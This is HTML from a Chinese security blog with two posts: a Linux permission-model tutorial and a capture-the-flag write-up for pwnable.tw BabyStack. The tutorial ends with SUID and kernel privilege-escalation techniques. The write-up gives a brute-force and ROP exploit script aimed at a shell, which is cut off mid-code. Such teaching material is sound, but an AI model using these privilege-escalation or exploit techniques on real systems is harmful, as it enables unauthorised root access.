            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-04-17 14:40:17" itemprop="dateModified" datetime="2024-04-17T14:40:17+08:00">2024-04-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Linux/" itemprop="url" rel="index"><span itemprop="name">Linux</span></a>
                </span>
            </span>

          
            <span id="/Tech/Linux/def2b48d2855.html" class="post-meta-item leancloud_visitors" data-flag-title="【Linux#0x01】Linux权限模型" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Linux/def2b48d2855.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Linux/def2b48d2855.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Linux系列第一篇！<br>本期介绍Linux中的权限模型，从 <code>ls -l</code> 的解释一路科普到内核漏洞的利用（什么！）</p>
<hr>
<p>由于 Linux 设计时是一个多用户系统，可能有很多人共用一个 Linux 系统，因此 Linux 中存在<strong>用户</strong>和<strong>用户组</strong>的概念，每个用户或者用户组都有一个自己的 id，每个用户可以属于多个用户组。<br>有了用户之间的区分，就可以为文件设置权限，限制不应该访问的用户的访问，于是就有了权限系统。</p>
<p>用户和用户组这两个抽象的概念，其实主要体现在两个地方：</p>
<ul>
<li>进程系统：每个进程都有自己所属的用户和用户组</li>
<li>文件系统：每个文件都有自己所属的用户和用户组，以及相应的读写权限设置</li>
</ul>
<p>可以使用 <code>getuid()</code> 系列系统调用获取当前进程的用户 id，在 shell 里可以直接输入 <code>id</code> 查看当前 shell 进程的用户和用户组 id。（这里先不提及 id 的区别，后面再进行讲解）</p>
<h2 id="文件系统中的权限模型"><a href="#文件系统中的权限模型" class="headerlink" title="文件系统中的权限模型"></a>文件系统中的权限模型</h2><p>使用命令 <code>ls -l</code> 可以查看文件的详细信息，比如：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ll</span><br><span class="line">drwxr-xr-x  4 cameudis cameudis   4096 Mar 24  2023 .cargo/</span><br><span class="line">drwx------  2 cameudis cameudis   4096 Nov  2 10:43 .ssh/</span><br><span class="line">-rw-r--r--  1 cameudis cameudis   4957 Oct 31 18:41 .bashrc</span><br><span class="line">-rw-r--r--  1 cameudis cameudis    619 Oct 31 10:11 memo.txt</span><br></pre></td></tr></table></figure>

<p>我们以第一条为例：</p>
<table>
<thead>
<tr>
<th>文件类型</th>
<th>权限信息</th>
<th>连结数</th>
<th>拥有者</th>
<th>用户组</th>
<th>文件大小</th>
<th>修改日期</th>
<th>文件名</th>
</tr>
</thead>
<tbody><tr>
<td><code>d</code></td>
<td><code>rwxr-xr-x</code></td>
<td><code>4</code></td>
<td><code>cameudis</code></td>
<td><code>cameudis</code></td>
<td><code>4096</code></td>
<td><code>Mar 24  2023</code></td>
<td><code>.cargo/</code></td>
</tr>
</tbody></table>
<p>第一个字段文件类型包括以下这些（从这里也可以看到万物皆文件的思想）：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>文件类型</th>
</tr>
</thead>
<tbody><tr>
<td>-</td>
<td>普通文件</td>
</tr>
<tr>
<td>d</td>
<td>目录</td>
</tr>
<tr>
<td>|</td>
<td>符号链接</td>
</tr>
<tr>
<td>p</td>
<td>named pipe</td>
</tr>
<tr>
<td>c</td>
<td>字符设备</td>
</tr>
<tr>
<td>b</td>
<td>块设备</td>
</tr>
<tr>
<td>s</td>
<td>socket 文件</td>
</tr>
</tbody></table>
<p>我们可以看到，每个文件都会有一个所属的用户、一个所属的用户组。相应地，一个文件的权限设置会有三档：<strong>对于所属用户的权限</strong>、<strong>对于所属用户组中用户的权限</strong>、<strong>对于其他用户的权限</strong>。在一些权限设置工具 <code>chmod</code> 中，这三者分别简称为 <code>U</code> <code>G</code> <code>O</code>，即 User、Group、Others。</p>
<p>在 <code>ls -h</code> 看到的信息中，我们看到的 <code>rwxr--r--</code> 字符串，其实就类似一个 bit vector。前三个字符表示对于所属用户的权限，中间三个表示所属用户组中用户的权限，最后三个字符表示对于其他用户的权限。</p>
<p>比如，<code>.cargo</code> 目录归 cameudis 所有，那么 cameudis 作为拥有者，其权限是 <code>rwx</code>（Read、Write、eXecute）；而另一个用户 Jern，若他不属于 cameudis 用户组，那么他的权限是 <code>r--</code>（Read only）。</p>
<blockquote>
<p>你可能会好奇，为什么 Linux 下各种目录大小都显示为 4096：这是硬盘中用来存储目录 metadata 信息的大小，这些 metadata 有：<br>如果你需要计算目录大小，可以使用 <code>du</code> 指令，比如 <code>du -sh /tmp</code>。</p>
</blockquote>
<h3 id="修改文件权限"><a href="#修改文件权限" class="headerlink" title="修改文件权限"></a>修改文件权限</h3><p>一句废话就是：如果想要修改文件的权限，你必须拥有文件的权限。<br>在命令行中，我们最常使用的修改权限工具是 <code>chmod</code>。</p>
<p>在 <code>chmod</code> 中，最简单的用法就是：<code>chmod &lt;+/-&gt;&lt;r/w/x&gt; &lt;filename&gt;</code>，这样会给用户、组和其他人通通加上或减去某个权限，比如：<code>chmod +x a.out</code> 就能让所有人都获取执行该文件的权限。</p>
<p>在此基础上，还可以特别指定某一群体：<code>chmod [ugoa...]&lt;+/-&gt;&lt;r/w/x&gt; &lt;filename&gt;</code>。比如 <code>chmod u+x a.out</code> 就可以只给拥有者执行该文件的权限。</p>
<p>不过，根据笔者观察，大家最常用的用法是直接使用数字指定。我们知道每个文件有三组权限，所以可以用三个 3 比特的值来分别表示一个文件的三组权限。在这个 3 比特的值中，约定最高位表示 r，中间一位表示 w，最后一位表示 x。所以，<code>111</code> 就对应 <code>rwx</code>，<code>010</code> 就对应 <code>-w-</code>。</p>
<p>然后，我们再将其写为 8 进制，<code>111</code> 就会变成 <code>7</code>（如果你硬要说是更大的进制也可以），这样我们就可以用一个阿拉伯数字表示一组权限。</p>
<p>再将其推广一下之后，就可以用三个数字表达三组权限，我们列出一些经常用到的权限作为例子：</p>
<table>
<thead>
<tr>
<th>权限编码</th>
<th>权限说明</th>
</tr>
</thead>
<tbody><tr>
<td>755</td>
<td>rwxr-xr-x</td>
</tr>
<tr>
<td>600</td>
<td>rw——-</td>
</tr>
<tr>
<td>644</td>
<td>rw-r–r–</td>
</tr>
<tr>
<td>777</td>
<td>rwxrwxrwx</td>
</tr>
</tbody></table>
<p>chmod 使用这种语法来让我们快速指定权限：<code>chmod 755 ./a.out</code> </p>
<blockquote>
<p><strong>冷知识：</strong><br>在著名动漫《新世纪福音战士新剧场版》中，明日香操纵 EVA 二号机进入野兽模式时，使用的指令是 “Code 777”，这说明 EVA 二号机运行的是 Linux 操作系统⊂彡☆))∀`)<br><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202311082023947.png" alt="chmod 777"></p>
</blockquote>
<blockquote>
<p><strong>常见的文件权限</strong><br>目录权限通常设置为755。其中7表示rwx，5表示rx。这里，x权限用于进入目录，r权限用于读取目录；换句话说，若去掉某个目录dir的x权限，则cd dir会报错；若去掉r保留x，则可以进入这个目录，但在目录中运行ls会出错；没有w权限，表示不能在目录中删除或新建文件。注意，删掉一个文件并不需要该文件的w权限，而只需要文件所在目录的w权限。一个文档文件的权限通常设置为422，即没有x权限。符号链接文件的权限为777，因为真正起作用的是链接所指向文件的权限。（来自<a target="_blank" rel="noopener" href="https://ipads.se.sjtu.edu.cn/ospi/">银杏书</a>）</p>
</blockquote>
<blockquote>
<p><strong>文件的权限被修改，对已被打开的文件会立即生效么？</strong><br>考虑如下情况：在进程 A 打开某个文件时，该文件具有可写权限，因此进程 A 以可读可写权限打开了文件；然后，文件的权限被拥有者修改为只读，那么之后当进程 A 对文件进行写操作时，会成功还是失败呢？根据前一段的描述，进程 A 会一直拥有对文件的写权限，直到关闭该文件。若系统希望对文件的权限更新立即生效，则需要在更新权限的同时，遍历所有打开文件的 fd 并做相应的处理，例如直接关闭所有权限不匹配的 fd，这样进程 A 下次进行文件操作时就会出现错误。（来自<a target="_blank" rel="noopener" href="https://ipads.se.sjtu.edu.cn/ospi/">银杏书</a>）</p>
</blockquote>
<h2 id="进程系统中的权限模型"><a href="#进程系统中的权限模型" class="headerlink" title="进程系统中的权限模型"></a>进程系统中的权限模型</h2><p>每个进程都会有 UID 和 GID，且相关数据会继承给子进程（当然满足条件就可以修改自己的 UID 和 GID，只要符合一些要求，可以到对应系统调用的 man page 中查看具体要求）：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> getuid.c</span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123; <span class="built_in">printf</span>(<span class="string">&quot;UID: %d\n&quot;</span>, getuid()); &#125;</span><br><span class="line">$ gcc -w -o getuid ./getuid.c</span><br><span class="line">$ <span class="built_in">id</span></span><br><span class="line">uid=1000(cameudis) gid=1000(cameudis) <span class="built_in">groups</span>=1000(cameudis),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)</span><br><span class="line">$ ./getuid</span><br><span class="line">UID: 1000</span><br></pre></td></tr></table></figure>

<p>一个进程并不是只有一个 UID（用户 ID）和一个 GID（用户组 ID），而是根据不同用途有多个。</p>
<p>在操作系统为进程准备的结构体中，一个进程包含如下几种 ID：</p>
<ul>
<li><strong>Effective（eUID、eGID）</strong>：大多数权限检查都使用这两个 ID。</li>
<li><strong>Real（UID、GID）</strong>：真正的 ID，可能与 eUID、eGID 不同，用作信号检查等。</li>
<li><strong>Saved</strong>：用于切换的 UID&#x2F;GID，在临时降权的时候用到。</li>
</ul>
<p>eUID 和 eGID 最为常用，进程是否能够打开文件等权限检查都使用 eUID 和 eGID，因此 <code>id</code> 指令默认显示的也是 eUID 和 eGID。（不过可以用 <code>-r</code> 参数指定显示 real UID&#x2F;GID）。</p>
<h3 id="SUID-amp-SGID"><a href="#SUID-amp-SGID" class="headerlink" title="SUID &amp; SGID"></a>SUID &amp; SGID</h3><p>之所以需要区分 effective ID 和 read ID，是因为在某些场景中，需要区分这两个 ID。我们设想这样一个场景（纯虚构，细节问题不要在意）：</p>
<blockquote>
<p>Jern 安装了一个 Web 服务器软件（假设服务器软件的所有者和用户组都是 Jern），想要让运维 Cameudis 也能够执行该软件，因此他就把软件文件的权限设置为 <code>r-x</code>。<br>Cameudis 开心地启动！了 Web 服务器，但是访问网站时发现无法正常访问网页。</p>
<p>原来由 Cameudis 执行的 Web 服务器进程，其 eUID 和 eGID 都是 Cameudis 的，因此这个进程没办法访问 Jern 放在目录中的 html 网页文件！</p>
</blockquote>
<p>为了解决场景中的这一问题，一个方法就是再给 Cameudis 目录中所有的文件的权限。但这种方法的缺陷在于，万一程序还需要访问未知位置的一些目录，我们可能不能一直及时地给 Cameudis 权限。<br>另一个方法就是将 Cameudis 加入 Jern 所在的用户组。这种方法挺好的，不过需要具体情况具体分析下加入之后有没有潜在危害。</p>
<p>此外，还有一种 Linux 提供的方法，这种机制允许用户在文件中加入 <code>SUID</code>、<code>SGID</code> 权限位（就和 RWX 一样），如下所示：</p>
<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/202311092333758.png"></p>
<ul>
<li><code>SUID</code> (Set-UID)：当前文件被执行时，以文件拥有者 UID 作为 eUID 而不是父进程的 eUID。</li>
<li><code>SGID</code> (Set-GID)：当前文件被执行时，以文件拥有组 GID 作为 eGID 而不是父进程的 eGID。</li>
</ul>
<blockquote>
<p>这里说当前文件被执行，显然默认了文件是可执行文件。不可执行文件被设置这两个位是可行的但并没有意义。</p>
</blockquote>
<p>因此，Jern 可以给 Web 服务器的程序文件加上 <code>SUID</code> bit，这样 Cameudis 执行 Web 服务器时，服务器进程会以 Jern 的 <code>eUID</code> 运行，从而就能够访问所有 Jern 本人可以访问的文件。</p>
<p>一个具体的例子就是 <code>sudo</code> 程序，我们可以这样查看其权限信息：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">which</span> sudo       <span class="comment"># which 让shell查找某个程序的具体位置</span></span><br><span class="line">/usr/bin/sudo</span><br><span class="line">$ ll /usr/bin/sudo</span><br><span class="line">-rwsr-xr-x 1 root root 166056 Apr  4  2023 /usr/bin/sudo*</span><br></pre></td></tr></table></figure>

<p>可以看到，sudo 的 <code>U</code> 权限是 <code>rws</code>，这里的 s 就表示 <code>SUID</code>。我们在执行 sudo 时，会以 root 用户的 <code>eUID</code> 执行，从而能够访问高权限的资源。</p>
<blockquote>
<p>使用 chmod 给文件加 SUID 和 SGID 的方法：<br><code>chmod u+s &lt;file&gt;</code><br><code>chmod g+s &lt;file&gt;</code></p>
</blockquote>
<h3 id="Sticky-bit"><a href="#Sticky-bit" class="headerlink" title="Sticky bit"></a>Sticky bit</h3><p>Sticky bit 主要用于目录，对于标记为 Sticky 的目录中的文件，只有<strong>文件的所有者与目录的所有者</strong>才能重命名或删除文件，其他行为则照常。</p>
<p>通常来说，我们用 Sticky bit 来保护一些共享的文件夹，这里的共享是指多个用户都会在这个文件夹中处理文件。比如，<code>/tmp</code> 文件夹就常常被置为 <code>Sticky</code>，来防止普通用户删除或者移动其他用户的文件：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ll /</span><br><span class="line">drwxrwxrwt  74 root root   36864 Nov  6 14:09 tmp/</span><br></pre></td></tr></table></figure>

<p>至于给非目录的普通文件置 Sticky bit，各类 Unix 系统的对待方式都不一样，比如 Linux 就是直接忽略置 Sticky 的文件。</p>
<blockquote>
<p>使用 chmod 给文件加 Sticky 的方法：<br><code>chmod o+t &lt;file&gt;</code></p>
</blockquote>
<h2 id="特殊的存在-root"><a href="#特殊的存在-root" class="headerlink" title="特殊的存在 root"></a>特殊的存在 root</h2><p>以上说的各种权限限制，<strong>都对 root 用户无效</strong>。作为 Linux 系统中的真神，root 用户和用户组都拥有特殊的 ID 0。通常为了使用 root 的力量，我们会借用 <code>sudo</code> 这个 <code>SUID</code>  程序。</p>
<p><img src="https://imgs.xkcd.com/comics/sandwich.png"></p>
<p>root 用户可以：</p>
<ul>
<li>打开任何文件，包括 <code>/proc</code> 中一些高权限的文件如 <code>kallsym</code>。</li>
<li>执行任何程序</li>
<li>切换到任何其他用户</li>
<li>调试任何程序</li>
<li>关机、重启</li>
<li>加载设备驱动等内核模块</li>
<li>……</li>
</ul>
<p>简单来说，<strong>root 用户可以控制整个系统</strong>。</p>
<p>由于 root 的力量过于强大，所以任何一个略有安全意识的人，在平时都不会以 root 用户的身份执行指令，除非必要。相关反例实在太多了，几乎每个默认 root 用户登录的人都会因此出现一些问题。（笑死）</p>
<p>既然 root 的力量如此强大，那么可想而知，如果黑客拿到了我们机器的 root 权限，那会是多么可怕的一场<strong>安全灾难</strong>。因此，接下来我们学习如何作为黑客拿到 root 权限。</p>
<h2 id="权限提升（提权）"><a href="#权限提升（提权）" class="headerlink" title="权限提升（提权）"></a>权限提升（提权）</h2><p>提权，一般就是指黑客将他们权限从普通用户提高到 root 的一类攻击，通常的提权流程是这样的：</p>
<ol>
<li>在系统上初步站稳脚跟，比如通过有漏洞的程序拿到一个 shell（pwn！）</li>
<li>找到一个可以利用的高权限服务</li>
<li>利用那个高权限服务，借助它拿到权限</li>
</ol>
<p>什么是可以利用的高权限服务呢？</p>
<ol>
<li><code>SUID</code> 程序就是一种高权限的服务，如果它存在漏洞的话，我们就可以通过利用漏洞来达成提权，比如 <code>sudo</code> 就有过非常多的 CVE，可以攻击 <code>sudo</code> 的漏洞来拿到 root 权限。</li>
<li>有一些不必要有 <code>SUID</code> 的程序，如果能够以 root 权限运行的话，会带来令人意想不到的安全风险。</li>
<li>操作系统内核显然是最高权限运行的服务了，如果内核存在漏洞，同样可以帮助我们达成提权。这就是传说中的<strong>内核漏洞利用</strong>。</li>
</ol>
<p>前者比较容易理解，就是普通的用户态程序利用而已，因此本文中我们主要介绍后两者。</p>
<h3 id="SUID-提权"><a href="#SUID-提权" class="headerlink" title="SUID 提权"></a>SUID 提权</h3><p>如果你发现 <code>mv</code> 程序是 <code>SUID</code> 的，你可以做到哪些事情？<br>看起来我们只能移动一些文件，但实际上，每个常见 Linux 程序的功能都可能非常强大。比如就算是简单的 <code>mv</code> 指令，也可以做到彻底的提权。</p>
<p><code>mv</code> 的提权方法，可以参考<a target="_blank" rel="noopener" href="https://medium.com/workindia-in/the-dark-side-of-mv-command-3419c1bd619">The Dark Side of <code>mv</code> Command. mv, short for MOVE has been one of the… | by Nikhil Jagtap | WorkIndia.in | Medium</a></p>
<p>更多 binary 的提权方法，可以见 <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>。</p>
<p>强烈推荐读者去 <a target="_blank" rel="noopener" href="https://pwn.college/fundamentals/program-misuse">pwn.college</a> 实地打几道题来试试看。</p>
<blockquote>
<p>如果 &#x2F;bin&#x2F;sh 作为一个 SUID 程序运行，即 eUID 和 rUID 不同，那么它会主动降权限，将 eUID 设置成 rUID。这就是一种应对 SUID 提权的非常简单的缓解措施。<br>遇到这种情况，只要加上 <code>-p</code> 参数即可。</p>
</blockquote>
<h3 id="内核漏洞"><a href="#内核漏洞" class="headerlink" title="内核漏洞"></a>内核漏洞</h3><p>我们知道，操作系统不过就是一个用户程序与资源的管理器而已，它同样也是一个由程序员写成的程序，操作系统也会有漏洞。</p>
<p>我们平常说的操作系统，通常包括了许多东西，比如桌面系统。不过，这里我们要关注的是一个操作系统真正重要的东西——<strong>内核</strong>（<strong>kernel</strong>，台湾称为<strong>核心</strong>）。</p>
<p>内核是一个运行在更高级别的程序，我们刚刚提到的各种机制，包括文件系统、进程系统，这些系统的实现统统位于内核之中。比如我们刚刚提到了 <code>eUID</code>、Real <code>UID</code>，这些东西统统都是内核中为每个进程准备的结构体中的一个字段。</p>
<p>如果读者学过 OS，那么就会知道用户态程序和内核交互的最常见的方法就是通过<strong>系统调用</strong>。因此，如果系统调用涉及的某段代码中存在漏洞，我们就能<strong>从用户程序攻击内核</strong>。（这就是为什么内核 pwn 的 exp 都是一个 C 程序，自己编写软件来攻击内核显然是最方便的）</p>
<p>提权是攻击内核最常见的目的之一。如果我们控制了内核，比如劫持了控制流，我们就可以去调用内核中存在的函数，将当前进程的权限提高至 root。</p>
<p>具体来说，我们一般会控制内核执行 <code>commit_creds(prepare_kernel_cred(0))</code>，其中 <code>prepare_kernel_cred(0)</code> 会创建一个各个字段都是 0 的 cred 结构体，然后 <code>commit_creds()</code> 可以将当前进程的 cred 替换为参数。我们前面知道 root 拥有特殊的 id —— 0，因此调用完这两个函数后，就可以将进程权限切换为 <code>root</code>。<br>此后进程就可以想干啥就干啥了，比如起一个 root shell。</p>
<p>当然，这里只是一个小科普，内核漏洞笔者还没有入门，希望读者里能有未来挖掘或利用内核漏洞的大能|∀`)</p>
<hr>
<p>参考资料：pwn.college</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/9f086a2e9319.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis's Homepage">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/9f086a2e9319.html" class="post-title-link" itemprop="url">【Pwn#0x14】pwnable.tw BabyStack writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-23 19:51:17" itemprop="dateCreated datePublished" datetime="2023-10-23T19:51:17+08:00">2023-10-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/9f086a2e9319.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x14】pwnable.tw BabyStack writeup" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/9f086a2e9319.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/9f086a2e9319.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本地打通了，远程……台湾太远了……爆破到一半就会不知道谁把我连接掐掉……</p>
<p><img src="https://blog-1308958542.cos.ap-shanghai.myqcloud.com/Snipaste_2023-10-23_20-43-43.jpg"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>本题主要有两个漏洞，一个是检查密码时，根据用户的输入的大小（strlen）作为 strncmp 的参数进行比较，然而这样会导致用户输入 NULL Byte 就通过检查，同时还允许了一字节一字节爆破得到正确的密码；甚至泄露密码后面的别的数据——在本题中就是程序基址。<br>另一个是一个没有检查大小的 strcpy。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>本题的流程就是先利用第一个漏洞来爆破得到栈上的密码以及 saved rbp，然后利用 strcpy 进行控制流劫持。由于 strcpy 限制 null byte 截断，所以我利用程序自己的 read wrapper 函数（CA0 处）来进行第二次写入，这次就可以写入 ROP chain。（这里调试得知 rdi 正好是栈上变量）<br>第一次写入 ROP chain，我泄露了 libc 的基址，让程序从 start 重头来过；第二次写入 ROP chain，我就直接执行 <code>system(&quot;/bin/sh&quot;)</code> 来拿到 shell。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># bruteforce password</span></span><br><span class="line">    password = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0x0a</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">            io.sendafter(<span class="string">b&quot;passowrd&quot;</span>, password + <span class="built_in">bytes</span>([ch]) + <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Success&quot;</span> <span class="keyword">in</span> io.recvline():</span><br><span class="line">                <span class="comment"># print(ch)</span></span><br><span class="line">                password += <span class="built_in">bytes</span>([ch])</span><br><span class="line">                io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(password) != i + <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    success(<span class="string">&quot;password: &quot;</span>+<span class="built_in">repr</span>(password))</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># bruteforce saved rbp (progaddr)</span></span><br><span class="line">    progaddr = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x6</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">0x100</span>):</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0x0a</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">            io.sendafter(<span class="string">b&quot;passowrd&quot;</span>, password + <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x10</span> + progaddr + <span class="built_in">bytes</span>([ch]) + <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Success&quot;</span> <span class="keyword">in</span> io.recvline():</span><br><span class="line">                <span class="comment"># print(ch)</span></span><br><span class="line">                progaddr += <span class="built_in">bytes</span>([ch])</span><br><span class="line">                io.sendafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(progaddr) != i + <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">    progaddr = unpack(progaddr+<span class="string">b&#x27;\0\0&#x27;</span>) - <span class="number">0x1060</span></span><br><span class="line">    success(<span class="string">&quot;stackaddr: &quot;</span>+<span class="built_in">hex</span>(progaddr))</span><br><span class="line"></span><br><span class="line">    my_read = <span 